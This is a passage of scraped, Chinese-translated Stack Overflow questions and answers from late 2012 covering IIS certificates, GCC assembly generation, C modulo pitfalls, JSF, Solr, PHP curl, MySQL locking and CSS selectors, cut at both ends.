12-26 19:20:19.026: E/AndroidRuntime(1119):     at android.os.Handler.dispatchMessage(Handler.java:99)
12-26 19:20:19.026: E/AndroidRuntime(1119):     at android.os.Looper.loop(Looper.java:123)
12-26 19:20:19.026: E/AndroidRuntime(1119):     at android.app.ActivityThread.main(ActivityThread.java:4644)
12-26 19:20:19.026: E/AndroidRuntime(1119):     at java.lang.reflect.Method.invokeNative(Native Method)
12-26 19:20:19.026: E/AndroidRuntime(1119):     at java.lang.reflect.Method.invoke(Method.java:521)
12-26 19:20:19.026: E/AndroidRuntime(1119):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:878)
12-26 19:20:19.026: E/AndroidRuntime(1119):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:636)
12-26 19:20:19.026: E/AndroidRuntime(1119):     at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-10T09:11:26.920

我已经解决了大型 PDF 文件的问题。我要做的不是阅读整个 PDF 文件，而是先阅读 50-100 页。

# wcf - IIS LocalSystem 应用程序池无法访问我的系统证书

> ID：14039836
> 
> 赞同：1
> 
> 时间：2012-12-26T11:17:01.560
> 
> 标签：wcf, iis, certificate, signing

我开发了 ac# (.NET 4.0) 应用程序，它使用 SecureBlackbox 库对 PDF 文档进行签名。对于我的签名，签名过程使用了一些来自**Trusted Root Certification Authorities**和**Intermediate Certification Authorities**的已安装用户证书。当我以用户身份打开我的测试应用程序时，签名有效，但是当我在 IIS 上的 WCF 服务中实现此模块时（对我的应用程序池使用**LocalSystem**标识）它不起作用，因为它找不到这些证书。

请注意，我已经在计算机帐户 -> 本地计算机管理单元中使用 mmc.exe 额外安装了这些证书，但这并不能解决问题。我也尝试将它们添加到服务帐户 -> 本地计算机 -> 万维网发布服务（那是 IIS，对吗？），但没有成功......

任何人都可以建议其他尝试吗？我完全不确定 IIS 将什么用作帐户，或者即使它可以通过其他方式访问我的证书，请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:36:32.593

确保证书具有本地系统的读取权限（如果这是您的 iis 进程设置为运行的内容）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-27T09:39:25.683

我发现正确的是，当您使用具有标识 LocalSystem 的 ApplicationPool 时，可以在添加管理单元时使用 mmc.exe 管理属于该系统的证书：计算机帐户 -> 本地计算机。实际问题是我在使用 SBB 库从系统存储中获取证书时编码错误。我已经解决了这个问题，因此我已经解决了这个问题。

# gcc - 编译器是否总是产生汇编代码？

> ID：14039843
> 
> 赞同：12
> 
> 时间：2012-12-26T11:17:32.187
> 
> 标签：gcc, assembly, compiler-construction

来自**C++ 中的思考 - 第 1 卷**：

> 在第二遍中，代码生成器遍历分析树并为树的节点生成汇编语言代码***或***机器代码。

至少在 GCC 中，如果我们提供生成汇编代码的选项，编译器会通过创建包含汇编代码的文件来服从。***但是，当我们简单地运行`gcc`没有任何选项的命令时，它不会在内部生成汇编代码吗？***

如果是，那为什么***需要***先生成汇编代码***，然后再***翻译成机器语言？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2018-12-17T15:21:54.760

**TL:DR 不同的目标文件格式/更容易移植到新的 Unix 平台（历史上）是 gcc 将汇编器与编译器分开的主要原因之一，我认为。** 在 gcc 之外，主流的 x86 C 和 C++ 编译器（clang/LLVM、MSVC、ICC）直接进入机器代码，[如果您要求它们，可以选择打印 asm 文本](https://stackoverflow.com/questions/38552116/how-to-remove-noise-from-gcc-clang-assembly-output)。

LLVM 和 MSVC 带有完整的工具链，而不仅仅是编译器。（还带有汇编器和链接器）。LLVM 已经将目标文件处理作为库函数，因此它可以使用它而不是写出 asm 文本来提供给单独的程序。

较小的项目通常选择将目标文件格式的详细信息留给汇编器。例如[，FreePascal 可以直接转到它的一些目标平台上的目标文件](https://cs.stackexchange.com/a/49425/35984)，否则只能转到 asm。有许多说法（[1](https://cs.stackexchange.com/questions/14749/why-do-compilers-produce-assembly-code)、[2](https://stackoverflow.com/questions/52901266/does-the-compiler-actually-produce-machine-code)、[3](https://stackoverflow.com/questions/62701333/why-do-c-compilers-translate-source-code-into-assembly-before-creating-machine)、[4](https://stackoverflow.com/questions/2135788/what-do-c-and-assembler-actually-compile-to)）几乎所有的编译器都通过 asm 文本，但对于许多拥有大量开发人员的最大最广泛使用的编译器（GCC 除外）来说，情况并非如此。

C 编译器倾向于仅针对单个平台（例如供应商的微控制器编译器）并被编写为“该平台的 C 实现”，或者是非常大的项目，例如 LLVM，其中不包括机器代码生成编译器自己的代码大小的很大一部分。不太广泛使用的语言的编译器通常更可移植，但不想编写自己的机器代码/目标文件处理。（现在很多编译器都是 LLVM 的前端，所以可以`.o`免费获得输出，比如`rustc`，但是旧的编译器没有这个选项。）

在所有编译器中，大多数都使用 asm。但是，如果您按每天使用每个文件的频率来衡量，那么直接访问可重定位目标文件 ( `.o`/ `.obj`) 占全球任何一天完成的总构建量的很大一部分。即，如果您正在阅读本文，您关心的编译器可能会以这种方式工作。

此外，像`javac`这样针对可移植字节码格式的编译器使用 asm 的理由较少；相同的输出文件和字节码格式适用于它们必须运行的每个平台。

有关的：

*   [https://retrocomputing.stackexchange.com/questions/14927/when-and-why-did-high-level-language-compilers-start-targeting-assembly-language](https://retrocomputing.stackexchange.com/questions/14927/when-and-why-did-high-level-language-compilers-start-targeting-assembly-language)关于逆向计算还有一些关于保持`as`分离优势的其他答案。
*   [在gcc、g++中生成ASM代码需要什么](https://stackoverflow.com/questions/34017789/what-is-the-need-to-generate-asm-code-in-gcc-g)
*   [C 和汇编程序实际上编译成什么？](https://stackoverflow.com/questions/2135788/what-do-c-and-assembler-actually-compile-to)- 即使是直接生成机器代码的编译器也不会直接生成链接的可执行文件，它们会生成可重定位的目标文件（`.o`或`.obj`）。[`tcc`Tiny C 编译器](https://bellard.org/tcc/)除外，它旨在动态用于单文件 C 程序。
*   半相关：[当我们有编译器时，为什么我们甚至需要汇编器？](https://stackoverflow.com/questions/51780158/why-do-we-even-need-assembler-when-we-have-compiler)asm 对人类查看机器代码很有用，而不是作为 C -> 机器代码的必要部分。

* * *

### 为什么 GCC 做它做的事

是的，`as`是一个单独的程序，`gcc`前端实际上与`cc1`（生成文本 asm 的 C 预处理器 + 编译器）分开运行。

这使得 gcc 更加模块化，使编译器本身成为一个文本 -> 文本程序。

GCC 在内部使用一些二进制数据结构来表示 GIMPLE 和 RTL 内部表示，但它不会将这些 IR 格式（的文本表示）写入文件，除非您使用特殊选项进行调试。

**那么为什么要在组装时停下来呢？这意味着 GCC 不需要知道同一目标的不同*目标文件*格式。** 例如，不同的 x86-64 操作系统使用 ELF、PE/COFF、MachO64 目标文件和历史上的 a.out。 `as`将相同的文本汇编组装成相同的机器代码，由不同目标上的不同目标文件元数据包围。（gcc 必须知道一些细微的区别，比如是否在`_`符号名称前加上一个，是否可以使用 32 位绝对地址，以及代码是否必须是 PIC。）

任何特定于平台的怪癖都可以留给 GNU binutils `as`（又名 GAS），或者 gcc 可以使用系统随附的供应商提供的汇编程序。

从历史上看，有许多不同的 Unix 系统具有不同的 CPU，或者特别是相同的 CPU，但它们的目标文件格式有不同的怪癖。更重要的是，一组相当兼容的汇编指令，如`.globl main`,`.asciiz "Hello World!\n"`和类似指令。GAS 语法来自 Unix 汇编程序。

过去确实可以将 GCC 移植到新的 Unix 平台*而无需*移植`as`，只需使用操作系统附带的汇编程序即可。

从来没有人将汇编器作为库集成到 GCC 的`cc1`编译器中。这是为 C 预处理器完成的（历史上也是在一个单独的进程中完成的），但不是汇编器。

* * *

**大多数其他编译器确实直接从编译器生成目标文件，没有文本 asm 临时文件/管道**。通常是因为编译器仅针对一个或几个目标设计，例如 MSVC 或 ICC 或最初仅作为 x86 的各种编译器，或许多供应商提供的嵌入式芯片编译器。

clang/LLVM 的设计比 GCC 晚得多。它被设计为优化 JIT 后端，因此它需要一个内置的汇编程序来快速生成机器代码。作为一个提前编译器，添加对不同目标文件格式的支持可能是一件小事，因为内部软件架构可以直接生成二进制机器代码。

LLVM 当然在寻找特定于后端的优化之前在内部使用 LLVM-IR 进行与目标无关的优化，但同样，如果您要求它，它只会将此格式写为文本。

* * *

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-26T12:20:46.207

汇编阶段的合理性有两个原因：

*   它允许将 c/c++ 代码转换为与机器无关的抽象汇编器，从中可以轻松转换为多种不同的指令集架构
*   当可以利用现有软件 [组件] 时，它消除了验证 CISC 架构的正确操作码、前缀、r/m 等指令编码的负担。

那本书的第一版是从 2000 年开始的，但不妨谈谈 90 年代初期，当时 c++ 本身被翻译成 c，当时 gnu/自由软件的想法（包括编译器的源代码）还不为人所知。

**编辑**： GCC 使用的几种无意义的[抽象机器独立语言](http://en.wikipedia.org/wiki/Intermediate_language)之一是 RTL -[注册传输语言](http://en.wikipedia.org/wiki/Register_Transfer_Language)。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-26T11:23:38.180

这是编译器实现的问题。汇编代码是高级语言（正在编译的语言）和生成的二进制输出之间的中间步骤。一般来说，首先转换为汇编，然后转换为二进制代码比直接创建二进制代码更容易。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-12-26T13:18:15.423

Gcc 确实将汇编代码创建为临时文件，调用汇编器，可能还有链接器，具体取决于您在命令行上执行或不添加的操作。这会创建一个对象，然后如果启用二进制文件，则所有临时文件都会被清理。使用 -save-temps 查看实际情况（有许多临时文件）。

不带任何选项运行 gcc 绝对会创建一个 asm 文件。

这没有“需要”，这只是他们碰巧设计它的方式。我假设出于多种原因，您在开始编译器之前已经想要/需要一个汇编器和链接器（先于马车，在处理器上先于其他语言使用 asm）。“unix 方式”是不重新发明工具或库，而只是在顶部添加一点，这意味着要使用 asm，然后让汇编器和链接器完成其余的工作。您不必以这种方式重新发明这么多的组装工作（多次通过、解析标签等）。开发人员调试 ascii asm 比调试位更容易。几代编译器都在这样做。及时编译器是这种习惯的主要例外，根据定义，它们必须能够转到机器代码，所以它们可以或可以。

# c - 使用负数时取模返回错误的结果

> ID：14039844
> 
> 赞同：2
> 
> 时间：2012-12-26T11:17:36.863
> 
> 标签：c, modulo

我想计算： (-15 % 3) 这应该是 0 但我得到的是 1：

当我明确这样做时：

```
int IntFcn (const void *key, size_t tableSize)
{
    printf("%d\n",(*(int*)key)); // prints -15
    printf("%d\n",tableSize); // prints 3
    printf("%d\n",(-15) % 3); // prints 0
} 
```

我得到了正确的结果（0），但是当我尝试使用下面的变量时，我得到 1：

```
int IntFcn (const void *key, size_t tableSize)
{
    printf("%d\n",(*(int*)key)); // prints -15
    printf("%d\n",tableSize); // prints 3
    printf("%d\n",((*(int*)key) % tableSize)); // prints 1
    return ((*(int*)key) % tableSize);
} 
```

为什么会这样？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-26T11:30:11.017

在第二种情况下，模数的第二个操作数是无符号整数，因此在执行模数之前，第一个操作数也被提升为无符号数。所以结果将`(unsigned)(-15) % 3`等于（对于 32-bit `int`）到`4294967281 % 3 == 1`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T11:44:14.423

试试这个..

`return ((*(int*)key) % (int)tableSize);`

# java - 标签更改后无法刷新jsf中的数据表

> ID：14039846
> 
> 赞同：0
> 
> 时间：2012-12-26T11:17:53.170
> 
> 标签：java, javascript, jquery, jsf, datatable

这是我的要求。我应该添加一条记录，成功添加并单击“查看”选项卡后，数据表应该刷新，但表保持不变。我正在使用 getter 方法从支持 bean 将数据提取到数据表中。

内部数据表：

```
<p:dataTable id="ci_table" value="#{ciConfigBean.ciList}" var="cid" scrollable="true" selectionMode="single" selection="#{ciConfigBean.ciConfigSave}"
            rowKey="#{cid.ciConfigId}" editable="true" resizableColumns="true"> 
```

我什至尝试通过从 onTabChange 事件调用它们来使用 javascript 方法。

第一个功能：

```
function onLoad() {
             alert("tab"); 
            var oTable;
            oTable = $('#ci_table').dataTable();
            oTable.fnClearTable( 0 );
            oTable.fnDraw();
        } 
```

第二个功能：

```
var oTable;
            $(document).ready(function() {
                    oTable = $('#ci_table').dataTable({
                        "bProcessing" : true,
                        "bServerSide" : true,
                        "sAjaxSource" : '${request.contextPath}'
                                + '/ciConfigBean/getCiList'
                        });
                        oTable.fnReloadAjax();
                }); 
```

标签更改代码：

```
<p:tab id="ci" title="CI">
            <p:tabView id="insideCi" onTabChange="onLoad()"
                activeIndex="#{home.activeInner}">
                <p:tab id="ciList" title="CI List">
                    <ui:include src="ci/ciList.xhtml" />
                </p:tab>
                <p:tab id="newCi" title="New CI">
                    <ui:include src="ci/newCi.xhtml" />
                </p:tab>
            </p:tabView>
        </p:tab> 
```

但似乎没有任何效果。对此有何建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:46:11.817

尝试在 tabview 标签上添加 dynamic="true"。假设您的保存方法有效，那应该可以解决问题，而我从您的帖子中看不到。不需要 JavaScript。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-27T02:56:12.987

@Andre，当我刷新整个页面时，数据表将更新。但是当我更改选项卡时它不会更新。这是我的 bean 中的 Save 方法：

```
public void saveCiConfig() throws SystemException {
    long ciId = CounterLocalServiceUtil.increment(CIConfig.class
                    .getName());
            ciConfigSave.setCiConfigId(ciId);
            ciConfigSave.setProjectId(0);
            ciConfigSave.setParentCIConfigId(0);
            ciConfigSave.setCreatedDate(new Date());
            ciConfigSave.setCreatedBy(FacesUtil.getUserId());
            ciConfigSave.setUpdatedDate(null);
            ciConfigSave.setUpdatedBy(0);
            if (enable == Boolean.TRUE) {
                ciConfigSave.setStatus(DataConstant.STATUS_ACTIVE);
            } else {
                ciConfigSave.setStatus(DataConstant.STATUS_INACTIVE);
            }
            ciConfigSave.setSetupComplete(Boolean.FALSE);
            try {
                  CIConfigLocalServiceUtil.addCIConfig(ciConfigSave);
                FacesMessageUtil
                        .addGlobalInfoMessage("ci.message.submitSuccess");
                new Home().setActiveOuter(0);
                new Home().setActiveInner(1);
                setEditMode(Boolean.FALSE);
                resetInit();
            } catch (SystemException e) {
                FacesMessageUtil
                        .addGlobalErrorMessage("ci.message.submitFailed");
                log.error("error while saving the CI Configuration", e);
            } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-03T09:02:26.803

好的，猜想没有正确的方法可以这样做......所以作为一种解决方法，我添加了一个命令按钮来手动刷新。

# java - Java 应用程序中的 org.JSON.JSONException

> ID：14039847
> 
> 赞同：0
> 
> 时间：2012-12-26T11:17:58.270
> 
> 标签：java, json, tomcat

我正在**Apache Tomact 6.0.32**上运行 java 应用程序并成功运行，并且我在具有相同 Apache Tomact 6.0.32 配置的**测试服务器上运行相同的东西并获得以下****异常**，任何帮助将不胜感激。

```
Caused by: java.lang.ClassNotFoundException: org.JSON.JSONException
        at java.net.URLClassLoader$1.run(URLClassLoader.java:200)
        at java.security.AccessController.doPrivileged(Native Method)
        at java.net.URLClassLoader.findClass(URLClassLoader.java:188)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:307)
        at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:301)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:252)
        at java.lang.ClassLoader.loadClassInternal(ClassLoader.java:320) 
```

我已经在使用 JSON Parser.jar

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:43:45.947

JSON lib 需要`commons-lang`和下面提到的其他库，如下[所述](http://json-lib.sourceforge.net/)。

> Json-lib 在您的类路径中需要（至少）以下依赖项：
> 
> ```
> jakarta commons-lang 2.5
> jakarta commons-beanutils 1.8.0
> jakarta commons-collections 3.2.1
> jakarta commons-logging 1.1.1
> ezmorph 1.0.6 
> ```

你确定你已经添加了上面的库。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T08:50:27.330

@Vardan Gupta，你认为tomcat是一样的，但事情不会一样。

如果我是你，我会这样做：

方案一）：拷贝测试服务器的tomcat 6.0.32到你运行成功的环境，然后在这个拷贝中测试war。

选择二）：或者你可以尝试将你运行成功的tomcat复制到测试服务器上，进行新的测试。这样，你就会发现事情。

以我的经验，我会将tomcat（运行成功复制）复制到测试服务器......

# solr - Solr 长期存储或导出功能

> ID：14039849
> 
> 赞同：0
> 
> 时间：2012-12-26T11:18:06.323
> 
> 标签：solr, storage

我们的 Solr 应用程序每天向 Solr 索引添加大约 1 GiB 的数据。应用程序仅访问最近 N 天的数据，但是必须保存所有数据以供将来使用。为了节省主服务器上的空间（昂贵），我想导出数据并将其保存在本地存储中（便宜）。MySQL具有出色的`mysqldump`功能，可以根据需要轻松导出和导入数据。Solr 是否有类似的功能可以在不关闭 Solr 应用程序的情况下激活？

我感兴趣的特定关键功能：

1.  Solr 运行时工作，无需停机。

2.  导出数据子集，例如`datetime:[1356220800 TO 1356393600]`

3.  导入数据

我感兴趣的特定非关键功能：

1.  能够搜索导出的数据以查找要插入的子集（使用常见的 GNU 工具，例如`grep`或小型独立工具。

2.  内在数据压缩。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-26T11:50:45.740

您可以检查：-

*   Solr[备份](http://wiki.apache.org/solr/SolrReplication#HTTP_API)- 将允许您在同一台服务器上备份索引。您可以重复使用该索引，因为它是一个成熟的 Solr 索引
*   [复制](http://wiki.apache.org/solr/SolrReplication)- 您可以定期复制每个并在不同的 Solr 服务器上维护索引。这基本上是导出和导入，因为它需要运行 Solr 并托管供您使用。
*   您始终可以使用[Delete](http://wiki.apache.org/solr/UpdateXmlMessages#A.22delete.22_documents_by_ID_and_by_Query)查询从 Solr 中删除（日期之前的所有记录）数据。

此外

*   没有特定时间的导出或转储功能。但是，您可以每天、每周执行上述操作，您将只拥有该期间内的数据。
*   以上所有内容都可以在 Solr 上运行而无需停机。
*   可以使用其他 Solr 实例或[Luke](http://www.getopt.org/luke/)查询索引。

# php - 使用 Curl Php 登录（POST 方法）

> ID：14039851
> 
> 赞同：0
> 
> 时间：2012-12-26T11:18:16.027
> 
> 标签：php, jquery, curl

大家好，我有一个包含邮件 ID 和密码的登录表单，在提交时它应该调用一个 api，然后生成一个身份验证令牌。我在 PHP curl 中使用了 POST 方法，但出现以下错误。

Apache Tomcat/6.0.36 - 错误报告.. 一些 html 样式.. 服务器拒绝了这个请求，因为请求实体的格式不受所请求方法的请求资源支持

这是我的ajax调用..

```
function callapi()
{ 
data = new Object();
var email= document.getElementById("input01").value;
var pwd=document.getElementById("input02").value;
if(email != ""&& pwd != "")
{
data.Email = email;
data.Pwd = pwd;

}

jQuery.ajax({ 
  url: "http://localhost/stackato/nlogin.php",
  type: "POST",
  dataType:"json",
  data:data,
  error: function (data) {
   alert('error--'+data);
  },
  success: function (data) { 

if(data=="invalid")
{

}
else
{

window.location.href="finalstackatolists1.html";
}

}
});

} 
```

这是我的 curl php 页面

```
<?php
header('Content-type: application/json');
$url = $_SERVER['REQUEST_URI'];
$scriptname = $_SERVER['SCRIPT_NAME']; 
$queryString = $_SERVER['QUERY_STRING'];
$mail=$_POST["Email"];
$pwd=$_POST["Pwd"];
$action = $_POST["action"];

$nurl = str_replace($scriptname,"...the api...",$url);

//open connection

$ch = curl_init(); 
$data = array("username" => $mail, "password" => $pwd);                                                                    
$req_data = json_encode($data);  

curl_setopt($ch, CURLOPT_URL, $nurl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $req_data);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);

 //execute post

if( ! $result = curl_exec($ch)) {
    die(curl_error($ch));
    curl_close($ch);
}

if(curl_getinfo($ch, CURLINFO_HTTP_CODE) == '500')
{
    header("Status: 500 Server Error");
}

curl_close($ch);

echo $result;

?> 
```

（我在 REST-Client 中尝试过，令牌已经生成）

请帮我解决这个问题..提前谢谢..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:45:08.837

您必须指定发布的数据是类型`JSON`

将此行添加到您的 curl 代码中

```
curl_setopt($ch, CURLOPT_HTTPHEADER, Array("Content-Type: application/json")); 
```

# mysql - MySQL InnoDB SELECT...LIMIT 1 FOR UPDATE 与 UPDATE ...LIMIT 1

> ID：14039853
> 
> 赞同：15
> 
> 时间：2012-12-26T11:18:28.823
> 
> 标签：mysql, sql-update

我在带有 InnoDB 引擎的 MySQL 中有一个表 v_ext：
- id：主键
- 代码：预先生成的代码列表（比如随机生成 1000 个代码）
- user_id：最初为 NULL

当用户购买商品时，他们会收到一个代码。我需要更新表以填充 user_id 列。我有两个选择：

```
START TRANSACTION;
SELECT id FROM v_ext WHERE user_id IS NULL LIMIT 1 FOR UPDATE; -- return id 54 for ex.
UPDATE v_ext SET user_id=xxx WHERE id=54;
COMMIT; 
```

或者

```
UPDATE v_ext SET user_id=xxx WHERE user_id IS NULL LIMIT 1; 
```

如果我有成千上万的用户同时购买，第二种选择是否安全？如果是这样，假设第二个选项对性能更好，因为它只需要一个查询是正确的吗？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-12-27T06:00:31.763

由于我没有得到答案，我开始做基准测试。我的标准如下：

*   20,000 个预生成代码
*   `ab`使用20,000 个请求，100 个并发的 Apache命令：`ab -n 20000 -c 100`
*   Servlet -> EJB (JPA 2.0 EclipseLink, JTA) 在 DB 中执行更新（因为在实际情况下它将通过 JSF 操作）
*   Servlet 的 2 个版本，一个带有选项 1（SELECT ... FOR UPDATE），一个带有选项 2（UPDATE ... LIMIT 1）
*   停止 Glassfish，手动点击 5 次测试的 Servlet 使其预热，将所有设置为 NULL 到 user_id
*   测试每次运行 3 次并提供平均值

结果：

选择...更新；更新 ... ：

```
Concurrency Level:      100
Time taken for tests:   758.116 seconds
Complete requests:      20000
Failed requests:        0
Write errors:           0
Row updated:            20000 
```

更新....限制1：

```
Concurrency Level:      100
Time taken for tests:   773.659 seconds
Complete requests:      20000
Failed requests:        0
Write errors:           0
Row updated:            20000 
```

所以至少在我的系统上，带有 2 个查询的选项似乎比一个查询更有效。我没想到:)

# mysql - MySql：查询以格式化数据库表中的特定列

> ID：14039862
> 
> 赞同：0
> 
> 时间：2012-12-26T11:19:17.887
> 
> 标签：mysql, sql

我在数据库表中有一个列名称phone_number。现在存储在表中的数字格式类似于ex.+91-852-9689568。我想格式化它，只需要数字。我怎样才能在 MySql 中做到这一点？我已经尝试过使用像 REGEXP 这样的函数，但它显示错误，比如函数不存在。而且我不想使用多个 REPLACE。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:34:37.227

if you want to format via projection only, use `SELECT`, you will only need to use replace twice and no problem with that.

```
SELECT REPLACE(REPLACE(columnNAme, '-', ''), '+', '') 
FROM   tableName 
```

otherwise, if you want to update the value permanently, use UPDATE

```
UPDATE tableName
SET    columnName = REPLACE(REPLACE(columnNAme, '-', ''), '+', '') 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T11:34:44.497

MySQL does not have a builtin function for pattern-matching and replace.

You'll be better off fetching the whole string back to your application, and then using a more flexible string-manipulation function on it. For instance, preg_replace() in PHP.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T11:24:31.813

一种选择是使用`mySql substring`. （只要格式不变）

```
SELECT concat(SUBSTRING(pNo,2,2), SUBSTRING(pNo,5,3), SUBSTRING(pNo,9,7)); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-26T11:36:58.233

请尝试以下内容并发表评论。

```
Select dbo.Regex('\d+',pNo);

Select dbo.Regex('[0-9]+',pNo); 
```

参考[RUBLAR](http://rubular.com/r/qUyIotCEBa)。

所以 MYSQL 不像 Oracle，因此你可以只使用[`USer defined Function to get numbers`](http://forums.mysql.com/read.php?10,394717,394909#msg-394909). 这可以让你继续前进。

# css - 在 CSS 中选择相邻元素

> ID：14039865
> 
> 赞同：1
> 
> 时间：2012-12-26T11:19:49.727
> 
> 标签：css, attributes, css-selectors

在 CSS 中，

是否可以匹配具有某个属性的元素，然后是具有另一个属性的元素，即。

让我们考虑一下

```
<div my-custom-attribute="0">
</div>

<div my-custom-attribute="1">
</div> 
```

我想选择所有 my-custom-attribute 等于 0 的元素，然后是 my-custom-attribute 等于 1 的元素

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:29:06.393

您可以通过属性选择器以相反的顺序执行此操作

```
div[my-custom-attribute="0"] > div[my-custom-attribute="1"] 
```

或者

```
<div id="parent">
    <div my-custom-attribute="0">
    </div>
    <div my-custom-attribute="1">
    </div>
</div>

#parent > div[my-custom-attribute]:not(:first-child) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T12:56:49.617

我认为这就是你想要的：

```
div[my-custom-attribute="0"] + div[my-custom-attribute="1"] { 
  color:red;
} 
```

[**演示**](http://jsbin.com/uximuj/2/edit)

有关选择器的更多信息，请参阅此[链接](http://www.w3.org/TR/CSS2/selector.html#adjacent-selectors)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T15:27:44.730

谢谢您的回答。我最终使用了 jQuery 选择器而不是 CSS。

就我而言，jQuery`prev()`工作

```
$($('div[my-custom-attribute="1"]').prev('div[my-custom-attribute="0"]')) 
```

# html - 一个简单的 html 上下文菜单的实现

> ID：14039868
> 
> 赞同：1
> 
> 时间：2012-12-26T11:20:03.157
> 
> 标签：html, asp.net-mvc-3

我正在开发一个系统 .Net MVC3，我需要实现一个简单的 html 上下文菜单，该菜单将与右键单击一起播放。

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-26T11:29:43.817

这是jquery上下文菜单[示例](http://medialize.github.com/jQuery-contextMenu/)和[演示](http://medialize.github.com/jQuery-contextMenu/demo/input.html)

[Flash 上下文菜单](http://www.milonic.com/menusample27.php)

[添加您自己的上下文菜单](http://msdn.microsoft.com/en-us/library/aa907671.aspx)

[javascript上下文菜单](http://luke.breuer.com/tutorial/javascript-context-menu-tutorial.htm)

希望这可以帮助

# magento - Magento：左侧类别的过滤器也显示在我们的主页左侧菜单中

> ID：14039871
> 
> 赞同：2
> 
> 时间：2012-12-26T11:20:25.323
> 
> 标签：magento

所以我正在更改 catalog.xml 中的代码

```
<catalog_category_layered translate="label">
<label>Catalog Category (Anchor)</label>
<reference name="left">
    <block type="catalog/layer_view" name="catalog.leftnav" after="currency" template="catalog/layer/view.phtml"/>
</reference>
</catalog_category_default>

<catalog_category_default translate="label">
<label>Catalog Category (Non-Anchor)</label>
<reference name="left">
<!--  <block type="catalog/navigation" name="catalog.leftnav" after="currency" template="catalog/navigation/left.phtml"/>-->
 <block type="catalog/layer_view" name="catalog.leftnav" after="currency" template="catalog/layer/view.phtml"/>
</reference>
</catalog_category_default> 
```

我想在我们的模板 home.phtml 中添加过滤层，但它不起作用我也在 home.phtml 管理 cms 设计中添加块，但它不起作用所以有人告诉我该怎么办？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T14:22:58.247

您是否检查过左侧是否有名称为“货币”的块？因为这段代码告诉 Magento 在名为 currency 的块之后添加它。

也许尝试以下将其放在首位。

```
<block type="catalog/layer_view" name="catalog.leftnav" before="-" template="catalog/layer/view.phtml"/> 
```

# emacs - Emacs lisp 中对符号名称的限制

> ID：14039872
> 
> 赞同：0
> 
> 时间：2012-12-26T11:20:31.923
> 
> 标签：emacs, elisp, standards

为了让自己干净，在 C 中，标识符必须匹配`[0-9_a-zA-Z]+`，如果它匹配`__.*`or ，这是不好的做法`_[A-Z]+`。可以标准阅读。我想知道关于elisp的完全相同的信息。我凭经验知道，我可以使用`:-@`，但不能`#`。请指出我正确的阅读地点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T12:20:01.340

没有硬性限制，尽管名称不易访问的符号几乎没有实际用途。

[http://www.gnu.org/software/emacs/manual/html_node/elisp/Creating-Symbols.html](http://www.gnu.org/software/emacs/manual/html_node/elisp/Creating-Symbols.html)

# python - 如果我在开源项目中公开我的数据库模式会很危险吗？

> ID：14039877
> 
> 赞同：2
> 
> 时间：2012-12-26T11:20:58.430
> 
> 标签：python, database, open-source, schema, database-schema

我正在用 python 写自己的博客，并将其放到 GitHub 上。

这个项目中的一个文件将是一个脚本，它在一开始就在 DB 中创建所需的表。由于我要将这个文件放在公共存储库中，因此我公开了所有数据库结构。

如果我这样做有危险吗？

如果是，我正在考虑将列名放在单独的配置文件中而不上传我的博客的列名的替代方法。避免暴露模式的其他方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-26T11:23:36.750

如果您保护对数据库的访问，这并不危险。你只是在暴露你的专业知识。一旦有人获得对数据库的访问权，就很容易列出数据库结构。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T11:27:07.493

共享数据库和数据库模式之间存在差异。您可以在代码中注释数据库机器/用户名/密码的值并将代码发布在 github 上。作为概念证明，您可以在云上托管您的应用程序（无需披露其数据库凭据）并将其链接添加到您的 github 自述文件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-01-13T08:56:44.463

我认为这很危险，好像你的网站中存在 SQL 注入漏洞，该方案将帮助攻击者更轻松地检索所有重要数据。

# grails - 从gsp页面Grails中的选择框中获取选定的值

> ID：14039880
> 
> 赞同：0
> 
> 时间：2012-12-26T11:21:12.470
> 
> 标签：grails, gsp

我想在 onChange 事件上获取 gsp 页面中选择框的值。我尝试了以下代码：

```
 <g:select id="resource-type" name="resource-type" from="${resultMap?.keySet()}" onchange="${remoteFunction(action:'updateDiffTable'
, update:'diff-table',params:[currentSelection:this.value,resultMap:resultMap])}"> 
```

我想将 currentSelection 参数设置为此选择框的值。问题是我在当前代码中得到了 null 。知道如何解决吗？

* * *

## 回答 #1

> 赞同：2
> 
